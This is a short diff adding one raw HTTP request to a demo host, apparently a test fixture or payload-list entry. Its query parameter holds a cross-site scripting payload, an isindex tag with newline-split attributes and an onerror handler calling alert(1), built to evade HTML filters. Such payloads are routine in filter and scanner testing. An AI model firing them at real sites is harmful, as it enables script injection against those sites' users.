@@ -1,0 +1,4 @@
+GET /a?data=<isindex%0atype%3Dimage%0asrc%3D1%0aonerror%3Dalert(1)> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
